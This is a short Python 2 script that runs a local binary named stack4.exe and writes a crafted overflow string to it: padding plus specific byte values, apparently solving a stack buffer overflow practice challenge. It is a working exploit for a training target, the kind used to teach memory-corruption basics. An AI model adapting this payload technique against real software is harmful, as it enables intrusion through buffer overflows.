import os

StdIn,StdOut = os.popen4(r".\stack4.exe")

XploitString = "x" * 50 + "\x53\x55\x72\x71" + "x" * 8 + "\x58\x41\x22\x35" + '\n'
print XploitString

StdIn.write(XploitString)
StdIn.close()

print StdOut.read()